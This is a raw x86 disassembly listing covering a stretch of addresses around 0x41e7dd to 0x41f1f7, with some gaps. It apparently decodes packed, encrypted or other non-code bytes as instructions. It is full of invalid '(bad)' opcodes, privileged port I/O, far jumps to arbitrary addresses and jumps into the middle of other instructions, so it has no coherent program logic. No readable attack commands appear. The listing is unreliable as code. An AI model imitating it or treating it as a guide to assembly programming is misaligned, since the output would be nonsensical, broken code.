  41e7dd:	sbb    BYTE PTR [eax-0x4d],ch
  41e7e0:	popaw  
  41e7e2:	cmp    bl,BYTE PTR [eax+0x423595ab]
  41e7e8:	push   edi
  41e7e9:	test   edx,ebx
  41e7eb:	pushf  
  41e7ec:	mov    dl,0xe4
  41e7ee:	pop    eax
  41e7ef:	jecxz  0x41e7e9
  41e7f1:	xchg   edx,eax
  41e7f2:	jmp    0xbc55a1a
  41e7f7:	add    edi,DWORD PTR [ebp+0x33912ca1]
  41e7fd:	sahf   
  41e7fe:	mov    ch,0x4
  41e800:	stc    
  41e801:	add    ebp,DWORD PTR [edi]
  41e803:	mov    ah,0x10
  41e805:	sbb    ebp,DWORD PTR [ebx-0x75]
  41e808:	jne    0x41e7ad
  41e80a:	repz mov ds:0xe0c63fe,eax
	...
  41e874:	sub    eax,0x9e5c8a39
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e8dc
  41e881:	test   DWORD PTR [ecx],0x144a0ca
  41e887:	add    BYTE PTR [ecx+eax*1],al
  41e88a:	add    BYTE PTR [eax],al
  41e88c:	add    DWORD PTR [edx-0x42f9cc13],ebx
  41e892:	mov    bh,ah
  41e894:	lahf   
  41e895:	sbb    edi,DWORD PTR [eax-0x2]
  41e898:	push   edx
  41e899:	clc    
  41e89a:	call   0x4fb6:0xe817f513
  41e8a1:	jmp    0xc687:0x71987667
  41e8a8:	shr    DWORD PTR [esi],cl
  41e8aa:	push   ss
  41e8ab:	(bad)  [edi+0x11]
  41e8ae:	inc    edx
  41e8af:	xchg   edi,eax
  41e8b0:	sub    BYTE PTR [edi-0x549eed6f],ah
  41e8b6:	popa   
  41e8b7:	ds mov al,0x8d
  41e8ba:	inc    esi
  41e8bb:	aaa    
  41e8bc:	frstor [ebx]
  41e8be:	push   ebx
  41e8bf:	lds    edi,FWORD PTR [ebp+0x53]
  41e8c2:	pop    DWORD PTR [ecx-0x66504e7]
  41e8c8:	sbb    ch,BYTE PTR [edx+0x5a]
  41e8cb:	fisttp QWORD PTR [ebx-0x3f74fe0]
  41e8d1:	mov    eax,ds:0xb8b6a504
  41e8d6:	jbe    0x41e908
  41e8d8:	jbe    0x41e8b6
  41e8da:	jb     0x41e911
  41e8dc:	loope  0x41e86c
  41e8de:	in     al,0x10
  41e8e0:	adc    BYTE PTR [ebx+0x68],ch
  41e8e3:	retf   0x8f90
  41e8e6:	cmp    dh,bl
  41e8e8:	and    eax,0xfa37b3fd
  41e8ed:	lock jns 0x41e90a
  41e8f0:	xchg   esp,eax
  41e8f1:	push   ebp
  41e8f2:	xor    al,0x63
  41e8f4:	into   
  41e8f5:	ins    DWORD PTR es:[edi],dx
  41e8f6:	cmp    DWORD PTR [ecx-0xf3723e8],edi
  41e8fc:	in     al,0xa1
  41e8fe:	mov    ebp,0xce1223d2
  41e903:	xchg   BYTE PTR ds:0xb2c6e7cd,dl
  41e909:	or     ah,BYTE PTR [esi]
  41e90b:	inc    ebx
  41e90c:	xor    BYTE PTR [ebp-0x3cab0341],ch
  41e912:	sbb    dl,ch
  41e914:	jecxz  0x41e983
  41e916:	test   eax,0x57ef711f
  41e91b:	jbe    0x41e940
  41e91d:	rcr    ebp,0xf0
  41e920:	push   esi
  41e921:	sahf   
  41e922:	cmp    DWORD PTR [esi],esi
  41e924:	into   
  41e925:	mov    esp,0xfe9b5db0
  41e92a:	iret   
  41e92b:	je     0x41e98f
  41e92d:	inc    edx
  41e92e:	cmp    eax,DWORD PTR cs:[edx+0x79]
  41e932:	inc    edi
  41e933:	ja     0x41e94e
  41e935:	sub    BYTE PTR [ebp+0x4db211be],cl
  41e93b:	mov    bl,0x29
  41e93d:	sbb    al,0xe1
  41e93f:	push   edx
  41e940:	jo     0x41e8fe
  41e942:	cld    
  41e943:	xchg   ebp,eax
  41e944:	cwde   
  41e945:	pop    ebx
  41e946:	(bad)  
  41e947:	aas    
  41e948:	shl    BYTE PTR [ebp-0x5ee8a8c6],0x13
  41e94f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e950:	fisub  WORD PTR [ebp+0x2d7e36ef]
  41e956:	(bad)  
  41e957:	cmp    ecx,DWORD PTR [ebp+0x10542202]
  41e95d:	and    BYTE PTR [edx],bl
  41e95f:	bound  edi,QWORD PTR [edx-0x41f38fb9]
  41e965:	sub    cl,al
  41e967:	imul   BYTE PTR [ebp-0x7afe289a]
  41e96d:	ds call 0xa2f3:0x2ae67a60
  41e975:	mov    eax,ds:0xd0ebcc60
  41e97a:	jmp    0xad1b54ac
  41e97f:	or     eax,0xbbd0d42a
  41e984:	mov    al,0x63
  41e986:	sbb    BYTE PTR [edi],al
  41e988:	scas   eax,DWORD PTR es:[edi]
  41e989:	in     al,dx
  41e98a:	stos   BYTE PTR es:[edi],al
  41e98b:	stc    
  41e98c:	add    BYTE PTR [eax],0x5a
  41e98f:	inc    esp
	...
  41e9f4:	js     0x41e9f3
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	sub    DWORD PTR [ebp+0x45a4a0e8],ecx
  41ea06:	add    DWORD PTR [eax],eax
  41ea08:	add    al,0x1
  41ea0a:	add    BYTE PTR [eax],al
  41ea0c:	sub    DWORD PTR [edx+eiz*4-0x7e],esp
  41ea10:	mov    WORD PTR [ecx-0xf],ss
  41ea13:	xchg   edi,eax
  41ea14:	push   ebx
  41ea15:	(bad)  
  41ea17:	and    eax,0x45afb0
  41ea1c:	ins    BYTE PTR es:[edi],dx
  41ea1d:	cmp    al,0xce
  41ea1f:	jno    0x41e9f4
  41ea21:	cmp    dh,BYTE PTR [edi]
  41ea23:	jmp    0xe817:0xd8d34587
  41ea2a:	or     BYTE PTR [edx+0x5b6b0ed7],cl
  41ea30:	sub    bl,BYTE PTR [ecx+0xcb11664]
  41ea36:	mov    dl,0x3a
  41ea38:	lds    edx,FWORD PTR [esi+0x2255d80]
  41ea3e:	jge    0x41eabb
  41ea40:	mov    ecx,0x5f970161
  41ea45:	aas    
  41ea46:	ror    ecx,1
  41ea48:	imul   eax,esp,0xffffffc0
  41ea4b:	mov    eax,0x2c4a7353
  41ea50:	sti    
  41ea51:	retf   
  41ea52:	imul   edi,ebp,0x2ee1219
  41ea58:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea5a:	or     al,0x76
  41ea5c:	xchg   esp,eax
  41ea5d:	test   eax,0xcec9fd94
  41ea62:	pusha  
  41ea63:	lea    edi,[edx+0x37]
  41ea66:	icebp  
  41ea67:	lods   eax,DWORD PTR ds:[esi]
  41ea68:	sbb    BYTE PTR [edx-0x8],bl
  41ea6b:	pop    ecx
  41ea6c:	ror    BYTE PTR [edx-0x5],cl
  41ea6f:	js     0x41ea65
  41ea71:	adc    BYTE PTR [esi-0x34f6e2bf],bh
  41ea77:	xchg   edx,eax
  41ea78:	push   0x23
  41ea7a:	adc    cl,BYTE PTR [ebx+0x177a732c]
  41ea80:	sub    BYTE PTR [ecx-0xa2ef449],cl
  41ea86:	imul   ecx,DWORD PTR [edx+0x54eb8d9],0x25
  41ea8d:	(bad)  
  41ea8e:	rol    BYTE PTR [ecx+eiz*8+0x50afece3],cl
  41ea95:	mov    al,0xab
  41ea97:	sub    eax,0xeb3b8738
  41ea9c:	sbb    al,0xa3
  41ea9e:	jno    0x41eb1a
  41eaa0:	dec    esp
  41eaa1:	test   DWORD PTR [edx],edx
  41eaa3:	sub    cl,BYTE PTR [ebp+0x14]
  41eaa6:	fiadd  WORD PTR [ebx-0x1]
  41eaa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eaaa:	xor    cl,BYTE PTR [eax-0x71262166]
  41eab0:	cdq    
  41eab1:	enter  0xe3a2,0xd1
  41eab5:	add    DWORD PTR [esi],edi
  41eab7:	stc    
  41eab8:	jb     0x41ea4d
  41eaba:	add    ch,BYTE PTR [edx-0x7a7b6dd0]
  41eac0:	mov    ch,ch
  41eac2:	xor    DWORD PTR [esi-0x321ffbd8],ebx
  41eac8:	aad    0x75
  41eaca:	clc    
  41eacb:	dec    esi
  41eacc:	mov    edx,0x617a4932
  41ead1:	or     al,0xfe
  41ead3:	jecxz  0x41eafa
  41ead5:	sub    BYTE PTR [edx],0xdd
  41ead8:	out    dx,eax
  41ead9:	dec    esi
  41eada:	das    
  41eadb:	sub    cl,BYTE PTR [ecx]
  41eadd:	lods   eax,DWORD PTR ds:[esi]
  41eade:	enter  0x27e5,0xca
  41eae2:	cmp    cl,BYTE PTR [edi+0x2d880c6e]
  41eae8:	loope  0x41ea6a
  41eaea:	fisttp DWORD PTR ds:0x20cd4cf
  41eaf0:	js     0x41eb4f
  41eaf2:	mov    eax,DWORD PTR [edx]
  41eaf4:	jecxz  0x41eac5
  41eaf6:	repz inc edi
  41eaf8:	dec    ebx
  41eaf9:	dec    esi
  41eafa:	mov    eax,ds:0x911bb2bc
  41eaff:	jge    0x41eabb
  41eb01:	mov    WORD PTR [edx],?
  41eb03:	out    dx,eax
  41eb04:	mov    eax,0xbbfc6fca
  41eb09:	jg     0x41eae5
  41eb0b:	pop    edx
  41eb0c:	sub    eax,0x7bdaf6
	...
  41eb71:	add    BYTE PTR [eax],al
  41eb73:	add    BYTE PTR [edx],dl
  41eb75:	das    
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0xef
  41eb81:	jg     0x41eb33
  41eb83:	enter  0x46a8,0x1
  41eb87:	add    BYTE PTR [ecx+eax*1],al
  41eb8a:	add    BYTE PTR [eax],al
  41eb8c:	fld    DWORD PTR [edi]
  41eb8e:	in     eax,dx
  41eb8f:	cli    
  41eb90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb91:	test   al,0x37
  41eb93:	mov    BYTE PTR [edx-0x67],dh
  41eb96:	xchg   ebx,eax
  41eb97:	pop    esp
  41eb98:	mov    dh,bh
  41eb9a:	in     eax,0x6
  41eb9c:	popf   
  41eb9d:	and    esp,DWORD PTR [edx+0x43]
  41eba0:	outs   dx,DWORD PTR ds:[esi]
  41eba1:	mov    edx,0x956a680e
  41eba6:	push   ebx
  41eba7:	sbb    DWORD PTR [edx-0x3dabc77f],ebx
  41ebad:	adc    DWORD PTR [edx+edx*1+0x4fcd03ad],eax
  41ebb4:	rol    dh,cl
  41ebb6:	sbb    BYTE PTR [edx-0x41d8d077],bh
  41ebbc:	fwait
  41ebbd:	in     al,0x19
  41ebbf:	retf   0xfeb4
  41ebc2:	fcomp  QWORD PTR [esi+ebx*2]
  41ebc5:	test   DWORD PTR [eax+edi*2-0xbb23f3c],0x30db67ed
  41ebd0:	add    eax,0x6c425d9
  41ebd5:	push   DWORD PTR [edi-0x24]
  41ebd8:	xchg   BYTE PTR [eax+0x75],ah
  41ebdb:	or     ebp,DWORD PTR cs:[esi]
  41ebde:	dec    edi
  41ebdf:	adc    eax,DWORD PTR [eax]
  41ebe1:	pop    ds
  41ebe2:	xor    al,0xc6
  41ebe4:	imul   ebx,DWORD PTR [edx+0x63],0x94b188d1
  41ebeb:	fcmovb st,st(5)
  41ebed:	or     DWORD PTR [ebx+0x5a],edi
  41ebf0:	mov    ecx,0xfdb80e92
  41ebf5:	xchg   edi,eax
  41ebf6:	add    BYTE PTR [edi-0x58],dl
  41ebf9:	(bad)  
  41ebfa:	mov    ecx,0xc8013067
  41ebff:	std    
  41ec00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec01:	dec    ecx
  41ec02:	mov    cl,0x15
  41ec04:	xor    al,0x8b
  41ec06:	ss out dx,al
  41ec08:	dec    ebp
  41ec09:	shl    BYTE PTR [ebx+ecx*8-0x60],0xa
  41ec0e:	or     bh,BYTE PTR [esi]
  41ec10:	(bad)  
  41ec11:	fldenv [esi]
  41ec13:	push   cs
  41ec14:	xchg   BYTE PTR [edx+0x7b],cl
  41ec17:	push   esi
  41ec18:	add    al,BYTE PTR [eax+0x26]
  41ec1b:	out    0x90,eax
  41ec1d:	sbb    al,0x31
  41ec1f:	cmp    BYTE PTR [eax],bl
  41ec21:	sub    eax,0x87f4d4de
  41ec26:	or     eax,esi
  41ec28:	leave  
  41ec29:	std    
  41ec2a:	je     0x41ec92
  41ec2c:	mov    eax,ds:0x4bb1feba
  41ec31:	jno    0x41ebf1
  41ec33:	(bad)  
  41ec35:	shr    BYTE PTR [edi+eiz*8],0x9b
  41ec39:	arpl   WORD PTR [ebp-0x6c],ax
  41ec3c:	sbb    ch,BYTE PTR cs:[ecx+ebp*4-0x7f]
  41ec41:	mov    eax,ds:0x630f3965
  41ec46:	xchg   ebx,eax
  41ec47:	xor    ebx,DWORD PTR [ebx-0x4e]
  41ec4a:	mov    esi,0x375f564b
  41ec4f:	sub    eax,0x102b2857
  41ec54:	or     ecx,eax
  41ec56:	sbb    DWORD PTR [ebx],ecx
  41ec58:	lahf   
  41ec59:	clc    
  41ec5a:	sub    edi,DWORD PTR [esi]
  41ec5c:	xor    BYTE PTR [esi],al
  41ec5e:	cmp    dl,BYTE PTR [ecx-0x51]
  41ec61:	mov    cs,WORD PTR [eax]
  41ec63:	and    ch,bl
  41ec65:	fiadd  WORD PTR [edi]
  41ec67:	cmc    
  41ec68:	adc    ebx,DWORD PTR [ecx-0x80]
  41ec6b:	mov    bh,0x4d
  41ec6d:	scas   al,BYTE PTR es:[edi]
  41ec6e:	sbb    BYTE PTR [edx+0x33],bl
  41ec71:	inc    eax
  41ec72:	aad    0x23
  41ec74:	cmp    DWORD PTR [eax+ecx*4],esp
  41ec77:	clc    
  41ec78:	inc    BYTE PTR [edx+0x58]
  41ec7b:	adc    DWORD PTR cs:[eax-0x3b],esp
  41ec7f:	aaa    
  41ec80:	add    dl,BYTE PTR [ecx+esi*1-0x4f50d2f6]
  41ec87:	mov    ebx,0xd603af2e
  41ec8c:	dec    ecx
  41ec8d:	aas    
  41ec8e:	icebp  
  41ec8f:	imul   eax,DWORD PTR [eax],0x0
	...
  41ecf2:	add    BYTE PTR [eax],al
  41ecf4:	inc    ecx
  41ecf5:	icebp  
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0x22a35fd0
  41ed02:	loope  0x41ed17
  41ed04:	lods   al,BYTE PTR ds:[esi]
  41ed05:	inc    edi
  41ed06:	add    DWORD PTR [eax],eax
  41ed08:	add    al,0x1
  41ed0a:	add    BYTE PTR [eax],al
  41ed0c:	xor    DWORD PTR [ecx+0x6a],0xee7136f9
  41ed13:	leave  
  41ed14:	leave  
  41ed15:	iret   
  41ed16:	inc    edx
  41ed17:	shr    BYTE PTR [eax+0x38],cl
  41ed1a:	cmp    esp,ecx
  41ed1c:	pushf  
  41ed1d:	xor    ah,BYTE PTR [ebp+0x3b]
  41ed20:	daa    
  41ed21:	mov    ds:0xd775bc8b,eax
  41ed26:	jns    0x41ed41
  41ed28:	fcmovnu st,st(5)
  41ed2a:	sbb    ah,BYTE PTR [edx]
  41ed2c:	jne    0x41ed18
  41ed2e:	(bad)  
  41ed2f:	iret   
  41ed30:	dec    ebx
  41ed31:	and    edx,0x38
  41ed34:	jge    0x41ed34
  41ed36:	mov    BYTE PTR [ecx+0x74],dl
  41ed39:	push   es
  41ed3a:	leave  
  41ed3b:	pop    ds
  41ed3c:	aaa    
  41ed3d:	pop    ds
  41ed3e:	ds mov ch,0xa7
  41ed41:	imul   ecx,DWORD PTR [eax-0x25],0xf
  41ed45:	push   ss
  41ed46:	enter  0x6eea,0x97
  41ed4a:	ja     0x41ed93
  41ed4c:	pop    esp
  41ed4d:	dec    esi
  41ed4e:	aaa    
  41ed4f:	into   
  41ed50:	xchg   ebp,eax
  41ed51:	push   cs
  41ed52:	pusha  
  41ed53:	xor    dl,0x8
  41ed56:	push   DWORD PTR [edx+0x7db0a36c]
  41ed5c:	adc    al,0xff
  41ed5e:	push   ss
  41ed5f:	add    ebp,DWORD PTR [esp+eiz*4+0x5c]
  41ed63:	mov    edi,0xde60478
  41ed68:	mov    DWORD PTR [eax+eiz*4+0xe346e2c],eax
  41ed6f:	scas   al,BYTE PTR es:[edi]
  41ed70:	les    ebp,FWORD PTR [esi+0x2d83abc1]
  41ed76:	sbb    al,cl
  41ed78:	mov    dh,0x1d
  41ed7a:	mov    bl,0x3e
  41ed7c:	push   ds
  41ed7d:	mov    ah,0x1a
  41ed7f:	add    eax,0xe0d9915a
  41ed84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed85:	sbb    DWORD PTR [edx+0x13],ebx
  41ed88:	xor    ch,dl
  41ed8a:	lea    esi,[ebp-0x36234866]
  41ed90:	mov    eax,0x7fe34a04
  41ed95:	cs out dx,eax
  41ed97:	bound  esi,QWORD PTR [edx+0x66]
  41ed9a:	adc    esp,DWORD PTR [eax+0x40]
  41ed9d:	and    DWORD PTR [ebx],ebp
  41ed9f:	mov    ah,0x42
  41eda1:	jb     0x41ee02
  41eda3:	ret    
  41eda4:	std    
  41eda5:	pop    fs
  41eda7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eda8:	js     0x41ed2d
  41edaa:	mov    ds:0x43eb207a,al
  41edaf:	xor    eax,0x2d8546d
  41edb4:	jbe    0x41edd7
  41edb6:	scas   al,BYTE PTR es:[edi]
  41edb7:	mov    cl,0xe5
  41edb9:	fs addr16 xchg edi,eax
  41edbc:	paddusw mm1,QWORD PTR [eax+edx*2-0x1d]
  41edc1:	fimul  WORD PTR [edx-0x798dadd2]
  41edc7:	xchg   esi,eax
  41edc8:	in     eax,0xbd
  41edca:	add    esi,edi
  41edcc:	cmp    eax,0x724c5f40
  41edd1:	test   DWORD PTR [eax+ebp*8+0x7c42fe92],ebp
  41edd8:	(bad)
  41eddb:	fnstsw WORD PTR [ebx]
  41eddd:	mov    ebx,0x63505fb4
  41ede2:	pop    esp
  41ede3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ede4:	mov    bh,dh
  41ede6:	adc    BYTE PTR [esi-0x23],al
  41ede9:	jecxz  0x41edde
  41edeb:	out    dx,eax
  41edec:	aas    
  41eded:	lds    ebp,FWORD PTR [edx+0x6b]
  41edf0:	js     0x41ede9
  41edf2:	jnp    0x41edba
  41edf4:	ins    BYTE PTR es:[edi],dx
  41edf5:	lds    edi,FWORD PTR ds:0x66fa701c
  41edfb:	dec    esp
  41edfc:	mov    cl,cl
  41edfe:	cdq    
  41edff:	(bad)  [ebx]
  41ee01:	jecxz  0x41ee35
  41ee03:	push   ecx
  41ee04:	mov    dh,0x9f
  41ee06:	ins    DWORD PTR es:[edi],dx
  41ee07:	mul    al
  41ee09:	jno    0x41edd2
  41ee0b:	xor    esi,esi
  41ee0d:	jl     0x41edea
  41ee0f:	aaa    
	...
  41ee74:	add    eax,0x7b197956
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0xb0a0:0x92fbe8e7
  41ee85:	dec    eax
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    al,0x1
  41ee8a:	add    BYTE PTR [eax],al
  41ee8c:	push   ebp
  41ee8d:	cmp    esp,esi
  41ee8f:	lods   al,BYTE PTR ds:[esi]
  41ee90:	gs nop
  41ee92:	or     edi,DWORD PTR [ecx-0x2ddc1b4]
  41ee98:	jmp    0x41ee1e
  41ee9a:	inc    edi
  41ee9b:	xor    eax,0x31be400b
  41eea0:	je     0x41eeb2
  41eea2:	jg     0x41ee2d
  41eea4:	fadd   st(6),st
  41eea6:	rcl    bl,0x44
  41eea9:	iret   
  41eeaa:	lds    ecx,FWORD PTR ds:0xd39a930a
  41eeb0:	jge    0x41ee6c
  41eeb2:	inc    edi
  41eeb3:	in     al,0x78
  41eeb5:	xchg   esp,eax
  41eeb6:	xor    ah,bh
  41eeb8:	xchg   BYTE PTR [eax+ecx*2],bl
  41eebb:	inc    edx
  41eebc:	or     eax,0x7eb5373b
  41eec1:	sbb    dl,al
  41eec3:	xor    al,0x1d
  41eec5:	mov    dl,0x1d
  41eec7:	pop    edi
  41eec8:	leave  
  41eec9:	mov    eax,0xcf7a8d19
  41eece:	cmp    BYTE PTR [edi-0x3735431c],ah
  41eed4:	jbe    0x41ee69
  41eed6:	fild   WORD PTR [ecx+0x4a8348a5]
  41eedc:	push   esi
  41eedd:	hlt    
  41eede:	mov    edx,0x47af1326
  41eee3:	mov    ebp,0x4f6e701a
  41eee8:	inc    DWORD PTR [edi]
  41eeea:	or     ecx,ecx
  41eeec:	in     eax,dx
  41eeed:	sub    BYTE PTR [eax+edx*8+0x3b],cl
  41eef1:	jp     0x41ee86
  41eef3:	add    al,0x48
  41eef5:	jmp    0x835d0e25
  41eefa:	push   ebp
  41eefb:	lods   eax,DWORD PTR ds:[esi]
  41eefc:	mov    eax,ds:0xab384d33
  41ef01:	mov    ebp,0x9ec8d95a
  41ef06:	sahf   
  41ef07:	call   0x1f1d:0xbbe55ced
  41ef0e:	and    eax,0x45735d53
  41ef13:	xor    BYTE PTR [ecx+0x57511b86],dl
  41ef19:	cmp    al,0xce
  41ef1b:	push   ss
  41ef1c:	mov    al,0x50
  41ef1e:	imul   ebp,eax,0xd6917a07
  41ef24:	mov    esp,0x6a913b40
  41ef29:	pop    ds
  41ef2a:	sbb    bl,BYTE PTR [ebx]
  41ef2c:	mov    al,0xfd
  41ef2e:	popa   
  41ef2f:	mov    esi,0x389e5484
  41ef34:	clc    
  41ef35:	and    al,0xf0
  41ef38:	(bad)  
  41ef3a:	fdiv   QWORD PTR [esi-0x5b]
  41ef3d:	mov    eax,ds:0x70f258ab
  41ef42:	pop    ss
  41ef43:	xchg   ebp,eax
  41ef44:	sti    
  41ef45:	mov    bl,BYTE PTR gs:[eax-0x4d]
  41ef49:	shr    eax,1
  41ef4b:	bnd ja 0x41ef8e
  41ef4e:	push   cs
  41ef4f:	push   ecx
  41ef50:	mov    al,0x4d
  41ef52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef53:	mov    ah,0xea
  41ef55:	sbb    dl,ah
  41ef57:	popf   
  41ef58:	sbb    BYTE PTR [edx+0x35b7ed27],al
  41ef5e:	xchg   ebx,eax
  41ef5f:	lds    ebp,FWORD PTR [eax-0xc4190e6]
  41ef65:	into   
  41ef66:	mov    bl,0xf2
  41ef68:	xchg   edx,eax
  41ef69:	mov    edi,0x6e5e2d4d
  41ef6e:	mov    cl,0xcd
  41ef70:	and    esp,0xffffffd2
  41ef73:	retf   
  41ef74:	mov    ds:0x1e002ced,al
  41ef79:	rcr    dl,cl
  41ef7b:	rcl    DWORD PTR [edx],0x7c
  41ef7e:	lods   al,BYTE PTR ds:[esi]
  41ef7f:	lea    esp,[ecx]
  41ef81:	mov    ecx,0x85dbabf2
  41ef86:	into   
  41ef87:	pop    eax
  41ef88:	daa    
  41ef89:	xchg   ecx,eax
  41ef8a:	pop    es
  41ef8b:	std    
  41ef8c:	mov    dh,0x2d
  41ef8e:	mov    esi,0x5e
	...
  41eff3:	add    BYTE PTR [ecx-0xda40a3],bh
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul ebx,ebx,0xffffffd4
  41f002:	clc    
  41f003:	jb     0x41efb9
  41f005:	dec    ecx
  41f006:	add    DWORD PTR [eax],eax
  41f008:	add    al,0x1
  41f00a:	add    BYTE PTR [eax],al
  41f00c:	aad    0x96
  41f00e:	cmc    
  41f00f:	xchg   ebx,eax
  41f010:	xor    DWORD PTR [ebp+0x23247bac],esi
  41f016:	dec    edi
  41f017:	pop    ebx
  41f018:	xor    BYTE PTR [esi],0x26
  41f01b:	(bad)  
  41f01c:	and    esp,DWORD PTR [eax]
  41f01e:	xchg   edi,eax
  41f01f:	fwait
  41f020:	les    esp,FWORD PTR [eax]
  41f022:	dec    edi
  41f023:	sbb    DWORD PTR [ecx-0x42],ebp
  41f026:	cmp    ecx,eax
  41f028:	mov    al,0x1a
  41f02a:	ja     0x41f02c
  41f02c:	inc    edi
  41f02d:	push   edi
  41f02e:	mov    ss,ebp
  41f030:	inc    eax
  41f031:	jmp    0x1cefd318
  41f036:	pop    ecx
  41f037:	out    0xd9,eax
  41f039:	push   ebx
  41f03b:	jp     0x41f011
  41f03d:	lods   eax,DWORD PTR ds:[esi]
  41f03e:	or     bh,dl
  41f040:	jle    0x41f089
  41f042:	imul   esp,DWORD PTR [edi-0x3962ed85],0x2b
  41f049:	(bad)  
  41f04b:	(bad)  
  41f04c:	or     al,0xa8
  41f04e:	push   ebx
  41f04f:	pop    ebp
  41f050:	xchg   eax,ecx
  41f052:	call   0x8dc4188e
  41f057:	and    edx,0xbbef928a
  41f05d:	hlt    
  41f05e:	sti    
  41f05f:	inc    esi
  41f060:	mov    ah,0xc3
  41f062:	adc    DWORD PTR [edi+0xb287594],edx
  41f068:	test   al,0xc
  41f06a:	mov    dh,0x47
  41f06c:	mov    DWORD PTR ds:0xf157f2,edx
  41f072:	or     BYTE PTR [ecx-0x1c3df8ed],cl
  41f078:	push   ebx
  41f079:	mov    eax,0x7f72e67c
  41f07e:	mov    al,0x4d
  41f080:	pop    eax
  41f081:	jp     0x41f0b1
  41f083:	mov    ebp,esp
  41f085:	cmp    BYTE PTR [ecx+0x13],0x67
  41f089:	dec    edi
  41f08a:	mov    ?,WORD PTR [esi+0x7a]
  41f08d:	bound  ecx,QWORD PTR [ebp-0x1603eb90]
  41f093:	in     al,dx
  41f094:	jns    0x41f0f8
  41f096:	push   edi
  41f097:	push   ebx
  41f098:	cli    
  41f099:	popf   
  41f09a:	out    dx,eax
  41f09b:	jnp    0x41f0bb
  41f09d:	aaa    
  41f09e:	add    ah,ah
  41f0a0:	and    al,0xbb
  41f0a2:	cdq    
  41f0a3:	ss jbe 0x41f06f
  41f0a6:	xor    al,0x23
  41f0a8:	mov    BYTE PTR [edx-0x5c4b0590],dh
  41f0ae:	popa   
  41f0af:	in     al,dx
  41f0b0:	pop    ds
  41f0b1:	push   0x49
  41f0b3:	pushf  
  41f0b4:	push   ecx
  41f0b5:	sbb    esi,edi
  41f0b7:	mov    ecx,0x3153d90e
  41f0bc:	mov    ebp,0x895ea35f
  41f0c1:	jnp    0x41f099
  41f0c3:	cli    
  41f0c4:	dec    esi
  41f0c5:	sub    esp,DWORD PTR [ecx+0xe]
  41f0c8:	test   al,0x1f
  41f0ca:	adc    al,0xb3
  41f0cc:	cld    
  41f0cd:	sub    DWORD PTR [edi],esi
  41f0cf:	jns    0x41f068
  41f0d1:	jne    0x1f97dbfd
  41f0d7:	mov    ecx,0xdb562c3f
  41f0dc:	cmp    al,0x74
  41f0de:	xor    ch,BYTE PTR [edx-0x2c]
  41f0e1:	or     DWORD PTR [edx],esp
  41f0e3:	adc    ah,BYTE PTR [esi+0x1720753b]
  41f0e9:	out    dx,al
  41f0ea:	inc    esi
  41f0eb:	(bad)  
  41f0ee:	add    edi,DWORD PTR [esi+0x4df89f62]
  41f0f4:	out    0x1c,eax
  41f0f6:	inc    esi
  41f0f7:	cmovp  edx,DWORD PTR [edi+esi*1+0x55]
  41f0fc:	adc    DWORD PTR [bp-0x4],0xb7e13608
  41f104:	dec    esp
  41f105:	mov    cs,WORD PTR ds:0x11afe929
  41f10b:	dec    esi
  41f10c:	sbb    BYTE PTR [esi+0x122b],0x0
	...
  41f173:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4ab8:0xe49d0a35
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    al,0x1
  41f18a:	add    BYTE PTR [eax],al
  41f18c:	xor    ch,al
  41f18e:	idiv   DWORD PTR [esi+0x34943807]
  41f194:	test   DWORD PTR [ebx+0x43],esp
  41f197:	mov    ebp,0xebdf3f21
  41f19c:	retf   0x3e53
  41f19f:	retf   0xc41d
  41f1a2:	xchg   esi,eax
  41f1a3:	mov    dl,0xb9
  41f1a5:	sub    BYTE PTR [eax+0x628ca506],ch
  41f1ab:	stc    
  41f1ac:	popf   
  41f1ad:	cmp    ecx,ebx
  41f1af:	fisttp WORD PTR [eax-0x79]
  41f1b2:	sbb    eax,0x92e9d07e
  41f1b7:	or     BYTE PTR [edx+0x5b1dd319],0xe3
  41f1be:	sar    bh,1
  41f1c0:	sar    BYTE PTR [edx+0x75],0x24
  41f1c4:	inc    edx
  41f1c5:	add    al,0xa2
  41f1c7:	lods   al,BYTE PTR ds:[esi]
  41f1c8:	xchg   esp,eax
  41f1c9:	inc    ebx
  41f1ca:	xor    BYTE PTR [edi+0x60a2bd9d],al
  41f1d0:	fwait
  41f1d1:	add    esi,edx
  41f1d3:	(bad)  
  41f1d4:	xchg   esi,eax
  41f1d5:	scas   eax,DWORD PTR es:[edi]
  41f1d6:	dec    ebp
  41f1d7:	retf   
  41f1d8:	scas   al,BYTE PTR es:[edi]
  41f1d9:	call   0xbc81ddd7
  41f1de:	scas   eax,DWORD PTR es:[edi]
  41f1df:	stos   DWORD PTR es:[edi],eax
  41f1e0:	or     al,0xc
  41f1e2:	lods   eax,DWORD PTR ds:[esi]
  41f1e3:	mov    eax,0xcecfbb73
  41f1e8:	xchg   ebp,eax
  41f1e9:	lock xchg ecx,eax
  41f1eb:	ins    BYTE PTR es:[edi],dx
  41f1ec:	test   BYTE PTR [eax+edi*1+0x75],0x35
  41f1f1:	stos   DWORD PTR es:[edi],eax
  41f1f2:	in     al,dx
  41f1f3:	mov    dh,0xe5
  41f1f5:	shl    al,cl
  41f1f7:	leave  
